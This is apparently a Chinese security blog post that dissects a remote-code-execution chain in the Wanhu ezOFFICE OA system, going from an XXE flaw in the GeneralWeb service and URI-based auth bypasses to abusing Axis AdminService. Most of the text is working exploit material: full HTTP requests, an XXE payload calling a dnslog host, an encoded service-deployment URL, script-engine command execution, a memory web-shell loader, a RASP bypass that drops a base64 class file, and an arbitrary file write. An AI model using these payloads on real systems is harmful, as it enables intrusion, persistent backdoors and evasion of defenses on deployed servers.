![](https://i-blog.csdnimg.cn/direct/9ed6fc88797b41d9a032575f148c354a.png)

之前实战遇到了，但是网上的poc懂得都懂，索性就专门研究一下

JDK版本：1.6.0
操作系统：Windows Server 2012
## 漏洞分析
从web.xml看起
![](https://i-blog.csdnimg.cn/direct/d8de58eaf7d94d36b2ffaf697ec95659.png)

使用了 XFire 与 Axis 两种 WebService 框架

看到 XFire 配置文件`D:/jboss/jboss-as/server/oa/deploy/defaultroot.war/WEB-INF/classes/META-INF/xfire/services.xml`
![](https://i-blog.csdnimg.cn/direct/e083ebbc102e4aa3b296127731288a2b.png)

配置了一个GeneralWeb的服务，找到该类`com.whir.service.webservice.GeneralWeb`
```java
package com.whir.service.webservice;

import com.whir.service.common.CallApi;

public class GeneralWeb {
    public String OAManager(String input) throws Exception {
        CallApi callapi = new CallApi();
        return callapi.getResult(input);
    }
}
```



`com.whir.service.common.CallApi#getResult`
```java
public String getResult(String input) throws Exception {
    if (serviceMap == null) {
        throw new Exception("Error: serviceMap can not is null");
    }
    SAXBuilder builder = new SAXBuilder();
    byte[] b = input.getBytes("utf-8");
    InputStream is = new ByteArrayInputStream(b);
    Document doc = builder.build(is);
    Element root = doc.getRootElement();
```
使用SAXBuilder进行解析并且未进行过滤，产生XXE漏洞

鉴权方面代码在`com.whir.common.util.SetCharacterEncodingFilter`
![](https://i-blog.csdnimg.cn/direct/500270d3332b4837825d2a3f7e4c60c9.png)

使用的是 getRequestURI，那么就有很多绕过方法了，简单列举几个
```
/iWebOfficeSign/OfficeServer.jsp/../../
/xfservices/./GeneralWeb
.jsp;.js
```

## 漏洞利用
触发dnslog：
```
POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
Host: 
User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Content-Type: text/xml;charset=UTF-8
SOAPAction: 
Content-Length: 457

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
  <soapenv:Body>
    <gen:OAManager>
      <gen:input>
        &lt;?xml version="1.0" encoding="UTF-8"?&gt;
        &lt;!DOCTYPE root [
        &lt;!ENTITY x SYSTEM "http://123.6x9ryk.dnslog.cn"&gt;]&gt;
        &lt;root&gt;&amp;x;&lt;/root&gt;
      </gen:input>
    </gen:OAManager>
  </soapenv:Body>
</soapenv:Envelope>
```
因为使用了Axis，我们可以通过AdminServlet创建任意服务，看到server-config.wsdd
```xml
<service name="AdminService" provider="java:MSG">
 <parameter name="allowedMethods" value="AdminService"/>
 <parameter name="enableRemoteAdmin" value="false"/>
 <parameter name="className" value="org.apache.axis.utils.Admin"/>
 <namespace>http://xml.apache.org/axis/wsdd/</namespace>
</service>
```
那么思路就很清晰了，通过xxe的get请求部署恶意服务，由于JDK是低版本，那么可以部署RhinoScriptEngineService
```xml
http://127.0.0.1:{{Port}}/defaultroot/services/./AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment
```
![](https://i-blog.csdnimg.cn/direct/9e75338b6cfa42a3886cc9050db67607.png)

部署成功
```
POST /defaultroot/services/./RhinoScriptEngineService HTTP/1.1
Host: 
User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Content-Type: text/xml;charset=UTF-8
SOAPAction: 
Content-Length: 973

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
  <soapenv:Body>
    <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
     <arg0 xmlns="">
     <![CDATA[
     try {
     load("nashorn:Moziilla_compat.js");
     } catch (e) {
     }
     importPackage(Packages.java.io);
     importPackage(Packages.java.lang);
     importPackage(Packages.java.util);

     var command = "cmd /c whoami";
     var pb = new java.lang.ProcessBuilder(Arrays.asList(command.split(" ")));
     var process = pb.start();
     var ret = new java.util.Scanner(process.getInputStream()).useDelimiter('\\A').next();
     ret;
     ]]>
     </arg0>
     <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
     </arg1>
    </eval>
  </soapenv:Body>
</soapenv:Envelope>
```
![](https://i-blog.csdnimg.cn/direct/c4378f1e9b704a1382f9647f79f54a7f.png)

成功执行命令

### 内存马
Java-Js-Engine-Payloads：[https://github.com/yzddmr6/Java-Js-Engine-Payloads](https://github.com/yzddmr6/Java-Js-Engine-Payloads)

适配了JDK6-14的内存马
```java
try {
    load("nashorn:mozilla_compat.js");
} catch (e) {
}

function getUnsafe() {
    var theUnsafeMethod =
        java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    theUnsafeMethod.setAccessible(true);
    return theUnsafeMethod.get(null);
}

function removeClassCache(clazz) {
    var unsafe = getUnsafe();
    var clazzAnonymousClass = unsafe.defineAnonymousClass(
        clazz,
        java.lang.Class.forName("java.lang.Class")
            .getResourceAsStream("Class.class")
            .readAllBytes(),
        null
    );
    var reflectionDataField =
        clazzAnonymousClass.getDeclaredField("reflectionData");
    unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField), null);
}

function bypassReflectionFilter() {
    var reflectionClass;
    try {
        reflectionClass = java.lang.Class.forName(
            "jdk.internal.reflect.Reflection"
        );
    } catch (error) {
        reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
    }
    var unsafe = getUnsafe();
    var classBuffer = reflectionClass
        .getResourceAsStream("Reflection.class")
        .readAllBytes();
    var reflectionAnonymousClass = unsafe.defineAnonymousClass(
        reflectionClass,
        classBuffer,
        null
    );
    var fieldFilterMapField =
        reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
    var methodFilterMapField =
        reflectionAnonymousClass.getDeclaredField("methodFilterMap");
    if (
        fieldFilterMapField
            .getType()
            .isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))
    ) {
        unsafe.putObject(
            reflectionClass,
            unsafe.staticFieldOffset(fieldFilterMapField),
            java.lang.Class.forName("java.util.HashMap")
                .getConstructor()
                .newInstance()
        );
    }
    if (
        methodFilterMapField
            .getType()
            .isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))
    ) {
        unsafe.putObject(
            reflectionClass,
            unsafe.staticFieldOffset(methodFilterMapField),
            java.lang.Class.forName("java.util.HashMap")
                .getConstructor()
                .newInstance()
        );
    }
    removeClassCache(java.lang.Class.forName("java.lang.Class"));
}

function setAccessible(accessibleObject) {
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName(
        "java.lang.reflect.AccessibleObject"
    ).getDeclaredField("override");
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}

function defineClass(bytes) {
    var clz = null;
    var version = java.lang.System.getProperty("java.version");
    var unsafe = getUnsafe();
    var classLoader = new java.net.URLClassLoader(
        java.lang.reflect.Array.newInstance(
            java.lang.Class.forName("java.net.URL"),
            0
        )
    );
    try {
        if (version.split(".")[0] >= 11) {
            bypassReflectionFilter();
            defineClassMethod = java.lang.Class.forName(
                "java.lang.ClassLoader"
            ).getDeclaredMethod(
                "defineClass",
                java.lang.Class.forName("[B"),
                java.lang.Integer.TYPE,
                java.lang.Integer.TYPE
            );
            setAccessible(defineClassMethod);
            clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
        } else {
            var protectionDomain = new java.security.ProtectionDomain(
                new java.security.CodeSource(
                    null,
                    java.lang.reflect.Array.newInstance(
                        java.lang.Class.forName("java.security.cert.Certificate"),
                        0
                    )
                ),
                null,
                classLoader,
                []
            );
            clz = unsafe.defineClass(
                null,
                bytes,
                0,
                bytes.length,
                classLoader,
                protectionDomain
            );
        }
    } catch (error) {
        error.printStackTrace();
    } finally {
        return clz;
    }
}

function base64DecodeToByte(str) {
    var bt;
    try {
        bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
    } catch (e) {
        bt = java.lang.Class.forName("java.util.Base64").newInstance().getDecoder().decode(str);
    }
    return bt;
}
clz = defineClass(base64DecodeToByte(code));
clz.newInstance();
```
由于JBoss 低版本套的是 tomcat，所以直接使用 tomcat 内存马即可
![](https://i-blog.csdnimg.cn/direct/2709350f096d4476a8ee4a3691793a52.png)

使用Listener组件，容错高
![](https://i-blog.csdnimg.cn/direct/2a06b864c4424d5ca8647cc4bc336992.png)

执行，无报错并且返回 200，说明成功了
![](https://i-blog.csdnimg.cn/direct/f4e5c1da653d4ba78c365bc680132fbc.png)

随便找个路径连接即可


### RASP绕过
在命令执行的时候可能会遇到：**java.lang.SecurityException: cmd execute denied !!!**
![](https://i-blog.csdnimg.cn/direct/6fa78964b1154fbd80a6da16363c3836.png)

即存在RASP，而RASP一般是通过黑名单进行过滤的

这里禁用了ProcessBuilder，我们尝试更底层的命令执行：ProcessImpl，该类是private，所以只能反射调用
![](https://i-blog.csdnimg.cn/direct/2b929d63721142cf8b3850a453915236.png)

这里JDK1.6和JDK1.8的构造方法存在差异，所以需要小小修改一下

当调用setAccessible的时候会报错：
```
sun.org.mozilla.javascript.internal.EcmaError: TypeError: Cannot call method "setAccessible" of null
```
![](https://i-blog.csdnimg.cn/direct/1de6247524794f65ba6482c95d872c40.png)

在js中无法反射调用，根据网上的文章，我们可以写class文件然后URLClassLoader去加载
```java
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Map;

public class Testcmd {
    String result = "";
    public Testcmd(String paramString) throws Exception{
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"bash", "-c", paramString} : new String[]{"cmd.exe", "/c", paramString};

        Class clazz = Class.forName("java.lang.ProcessImpl");
        Method method = clazz.getDeclaredMethod("start", String[].class, Map.class,String.class,boolean.class);
        method.setAccessible(true);
        InputStream ins = ((Process) method.invoke(null,cmds,null,null,true)).getInputStream();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] bytes = new byte[1024];
        int size;
        while((size = ins.read(bytes)) > 0)
                bos.write(bytes,0,size);

        ins.close();
        this.result = bos.toString();
    }
        
    public java.lang.String toString() {
        return this.result;
    }
    public static void main(String[] args) {
    }
}
```
没有ban掉File类，可以将class文件写入到系统中
```java
try {
load("nashorn:Moziilla_compat.js");
} catch (e) {
}
importPackage(Packages.java.io);
importPackage(Packages.java.lang);
importPackage(Packages.sun.misc);

var file = new File("../server/Testcmd.class");

var fos = new FileOutputStream(file);
var base64Decoder = new BASE64Decoder();
var decodeContent = base64Decoder.decodeBuffer("yv66vgAAADIAkAoAFwBPCABQCQAiAFEIAFIKAFMAVAoACQBVCABWCgAJAFcHAFgIAFkIAFoIAFsIAFwIAF0KABEAXggAXwcAYAcAMQcAYQkAYgBjCgARAGQKAGUAZgcAZwoAYgBoCgBlAGkHAGoKABoAawcAbAoAHABPCgBtAG4KABwAbwoAbQBwCgAcAHEHAHIBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACUxUZXN0Y21kOwEAC3BhcmFtU3RyaW5nAQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQADaW5zAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADYm9zAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABWJ5dGVzAQACW0IBAARzaXplAQABSQEADVN0YWNrTWFwVGFibGUHAHIHAFgHAGAHAHMHAHQHAGwHADsBAApFeGNlcHRpb25zBwB1AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAClNvdXJjZUZpbGUBACFUZXN0Y21kLmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMACUAdgEAAAwAIwAkAQAHb3MubmFtZQcAdwwAeAB5DAB6AEkBAAN3aW4MAHsAfAEAEGphdmEvbGFuZy9TdHJpbmcBAARiYXNoAQACLWMBAAdjbWQuZXhlAQACL2MBABVqYXZhLmxhbmcuUHJvY2Vzc0ltcGwMAH0AfgEABXN0YXJ0AQAPamF2YS9sYW5nL0NsYXNzAQANamF2YS91dGlsL01hcAcAfwwAgAAzDACBAIIHAHMMAIMAhAEAEGphdmEvbGFuZy9PYmplY3QMAIUAhgwAhwCIAQARamF2YS9sYW5nL1Byb2Nlc3MMAIkAigEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwB0DACLAIwMAI0AjgwAjwB2DABIAEkBAAdUZXN0Y21kAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAMoKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9Cb29sZWFuAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihaKUxqYXZhL2xhbmcvQm9vbGVhbjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFY2xvc2UAIQAiABcAAAABAAAAIwAkAAAAAwABACUAJgACACcAAAH5AAYACwAAAOIqtwABKhICtQADBD0SBLgABU4txgARLbYABhIHtgAImQAFAz0cmQAYBr0ACVkDEgpTWQQSC1NZBStTpwAVBr0ACVkDEgxTWQQSDVNZBStTOgQSDrgADzoFGQUSEAe9ABFZAxMAElNZBBMAE1NZBRMACVNZBrIAFFO2ABU6BhkGBLYAFhkGAQe9ABdZAxkEU1kEAVNZBQFTWQYEuAAYU7YAGcAAGrYAGzoHuwAcWbcAHToIEQQAvAg6CRkHGQm2AB5ZNgqeABAZCBkJAxUKtgAfp//pGQe2ACAqGQi2ACG1AAOxAAAAAwAoAAAASgASAAAACAAEAAcACgAJAAwACgASAAsAIgAMACQADgBRABAAWAARAH0AEgCDABMAqQAUALIAFQC5ABcAxgAYANMAGgDYABsA4QAcACkAAABwAAsAAADiACoAKwAAAAAA4gAsACQAAQAMANYALQAuAAIAEgDQAC8AJAADAFEAkQAwADEABABYAIoAMgAzAAUAfQBlADQANQAGAKkAOQA2ADcABwCyADAAOAA5AAgAuQApADoAOwAJAMMAHwA8AD0ACgA+AAAAPwAF/wAkAAQHAD8HAEABBwBAAAAYUQcAEv8AaQAKBwA/BwBAAQcAQAcAEgcAQQcAQgcAQwcARAcARQAA/AAZAQBGAAAABAABAEcAAQBIAEkAAQAnAAAALwABAAEAAAAFKrQAA7AAAAACACgAAAAGAAEAAAAeACkAAAAMAAEAAAAFACoAKwAAAAkASgBLAAEAJwAAACsAAAABAAAAAbEAAAACACgAAAAGAAEAAAAiACkAAAAMAAEAAAABAEwAMQAAAAEATQAAAAIATg==");
fos.write(decodeContent, new Integer(0), new Integer(decodeContent.length));
fos.close();
```
最后就是网上公开的poc了
![](https://i-blog.csdnimg.cn/direct/4ceb1747a18b4671ad4383b9538dd279.png)


### StringUtil任意文件写
网上还存在一种方法：使用`com.whir.ezoffice.ezform.util.StringUtil`这个类写文件
![](https://i-blog.csdnimg.cn/direct/e17e65693bbc49d7983157256ee42eb6.png)

存在无参构造方法，满足service条件
```java
private static void writeToFile(String fileName, String content) throws IOException {
    BufferedOutputStream outStream = null;
    OutputStreamWriter writer = null;

    try {
        String dirPath = "";
        if (fileName.lastIndexOf("/") != -1) {
            dirPath = fileName.substring(0, fileName.lastIndexOf("/"));
        }

        File dir = new File(dirPath);
        if (!dir.exists() && !dir.mkdirs()) {
            throw new IOException("create directory '" + dirPath + "' failed!");
        }

        outStream = new BufferedOutputStream(new FileOutputStream(fileName, true));
        writer = new OutputStreamWriter(outStream);
        writer.write(content);
    } catch (IOException var9) {
        throw var9;
    } finally {
        if (writer != null) {
            writer.close();
        }

        if (outStream != null) {
            outStream.close();
        }

    }

}

public static void printToFile(String fileName, String content) throws IOException {
    writeToFile(fileName, content);
}

public static void printlnToFile(String fileName, String content) throws IOException {
    writeToFile(fileName, content + "\n");
}
```

可以通过 printToFile 方法任意文件写，内容以及文件名均可控
```
http://127.0.0.1:{{port}}/defaultroot/services/./AdminService?method=!--%3E%3Cdeployment%20xmlns=%22http://xml.apache.org/axis/wsdd/%22%20xmlns:java=%22http://xml.apache.org/axis/wsdd/providers/java%22%3E%3Cservice%20name=%22freemarkerQa%22%20provider=%22java:RPC%22%3E%3Cparameter%20name=%22className%22%20value=%22com.whir.ezoffice.ezform.util.StringUtil%22/%3E%3Cparameter%20name=%22allowedMethods%22%20value=%22*%22/%3E%3C/service%3E%3C/deployment
```
网上众多的 freemarkerQa 服务均是调用的该类
```
POST /defaultroot/./services/freemarkerQa HTTP/1.1
Host: 
User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Content-Length: 606

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://util.ezform.ezoffice.whir.com">
  <soapenv:Body>
    <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <fileName xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">../server/oa/deploy/defaultroot.war/1.txt</fileName>
      <content xsi:type="soapenc:string">x</content>
    </util:printToFile>
  </soapenv:Body>
</soapenv:Envelope>
```
![](https://i-blog.csdnimg.cn/direct/951ac5f9fa214f33b1e5a68546e69a3b.png)

验证成功

## 总结
实战中很有意思的一个漏洞，但网上的poc。。。呃呃

还可以尝试打freemarker、bsh

万户作为老牌oa，还是很值得去学习研究的

参考：
[万户rce](https://mp.weixin.qq.com/s/sktnBnCrZUoqkhGM0O9HRQ)
[实战 | 万户GeneralWeb组合Bypass Rasp](https://mp.weixin.qq.com/s/4FyX_zmY90yGLzdJgUGzcg)

